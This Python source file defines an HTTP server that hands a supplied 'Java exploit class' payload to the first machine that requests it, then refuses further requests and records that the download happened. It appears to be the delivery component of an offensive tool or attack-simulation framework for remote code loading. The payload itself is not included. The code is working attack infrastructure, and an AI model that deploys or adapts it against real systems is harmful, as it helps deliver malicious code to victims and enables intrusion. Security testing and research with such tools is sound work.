import http.server
import logging
import threading

logger = logging.getLogger(__name__)

HTTP_TOO_MANY_REQUESTS_ERROR_CODE = 429


class HTTPHandler(http.server.BaseHTTPRequestHandler):

    java_class: bytes
    class_downloaded: threading.Event

    def do_GET(self):
        if HTTPHandler.class_downloaded.is_set():
            self.send_error(
                HTTP_TOO_MANY_REQUESTS_ERROR_CODE, "Java exploit class has already been downloaded"
            )
            return

        HTTPHandler.class_downloaded.set()
        logger.info("Java class servergot a GET request!")
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()
        logger.info("Sending the payload class!")
        self.wfile.write(self.java_class)


class ExploitClassHTTPServer:
    def __init__(self, ip: str, port: int, java_class: bytes, poll_interval: float = 0.5):
        logger.debug(f"The Java Exploit class will be served at {ip}:{port}")

        self._class_downloaded = threading.Event()
        self._poll_interval = poll_interval

        self._initialize_http_handler(java_class)

        self._server = http.server.HTTPServer((ip, port), HTTPHandler)

    def _initialize_http_handler(self, java_class: bytes):
        HTTPHandler.java_class = java_class
        HTTPHandler.class_downloaded = self._class_downloaded

    def run(self):
        logger.info("Starting ExploitClassHTTPServer")
        self._class_downloaded.clear()

        self._server.serve_forever(self._poll_interval)
        logger.debug("The Java Exploit class HTTP server has stopped")

    def stop(self):
        logger.debug("Stopping the Java Exploit class HTTP server")
        self._server.shutdown()

    def exploit_class_downloaded(self) -> bool:
        return self._class_downloaded.is_set()
